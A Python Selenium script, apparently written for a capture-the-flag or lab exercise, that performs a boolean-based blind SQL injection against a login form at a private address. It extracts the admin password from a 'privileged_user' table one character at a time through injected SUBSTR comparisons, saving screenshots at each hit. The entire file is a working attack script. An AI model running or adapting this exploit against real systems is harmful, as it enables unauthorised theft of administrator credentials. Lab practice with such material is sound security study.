import getpass
import string
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import StaleElementReferenceException

driver = webdriver.Chrome()
driver.get("http://10.20.12.187:4003")
driver.implicitly_wait(2)

query_f = "guest' AND (SELECT SUBSTR(password,"
query_m = ",1) FROM privileged_user WHERE username='admin')='"
query_e = "' --"
i = 1
flag = ""

while True:
    for j in string.printable:
        user_id = query_f + str(i) + query_m + str(j) + query_e

        driver.find_element(By.ID, 'inputUsername').send_keys(user_id)
        driver.find_element(By.XPATH, '/html/body/form/button').click()

        # Wait until the element is present in the DOM
        for _ in range(3):  # Retry up to 3 times
            try:
                output_element = driver.find_element(By.XPATH, "/html/body/form/div")
                output = output_element.text
                break  # Exit loop if successful
            except StaleElementReferenceException:
                pass  # Retry locating the element
        
        cmp = "1 user has the name " + user_id
        print(cmp)
        print(output)
        if(output == cmp):
            print(output)
            file_name = str(i) + "th.png"
            driver.get_screenshot_as_file(file_name)
            flag += j
            i += 1
            break
            
        print(flag)
    
    if i > 38:
        break

print(flag)

driver.quit